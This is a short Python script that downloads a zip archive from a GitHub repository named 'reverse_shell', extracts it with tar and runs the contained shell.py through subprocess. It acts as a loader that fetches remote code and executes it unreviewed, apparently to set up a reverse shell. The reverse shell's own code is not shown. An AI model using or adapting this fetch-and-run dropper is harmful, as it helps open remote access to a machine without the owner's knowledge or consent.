from pathlib import Path
import subprocess
import time
import os
import urllib.request

url = "https://github.com/jhonnunes443/reverse_shell/archive/refs/heads/main.zip"
comand = f"curl -o main.zip {url}"
unziping = "tar -xvf main.zip"
directory = "reverse_shell-main"
execution = "python3 shell.py"


file1 = Path("shell.py")
file2 = Path("reverse_shell-main/shell.py")
file3 = Path("main.zip")

def existing_file():
    if file2.is_file():
        print("Changing directory.")
        os.chdir(directory) 
        print("#Running script.#")
        subprocess.run(execution, shell=True)
    else:
        print("Failure to acess file.\n")

existing_file()

def downloading_file():
    if not file1.is_file():
        print("File not exist. \n")
        time.sleep(1)
        print("Downloading file...\n\n") 
        urllib.request.urlretrieve(url, file3)
        time.sleep(1)
        print("Unziping file.\n")
        subprocess.run(unziping, shell=True)
        time.sleep(1)
        print("Changing directory.")
        os.chdir(directory) 
        print("#Running script.#")
        subprocess.run(execution, shell=True)
    else:
        print("Process fail.")

downloading_file()


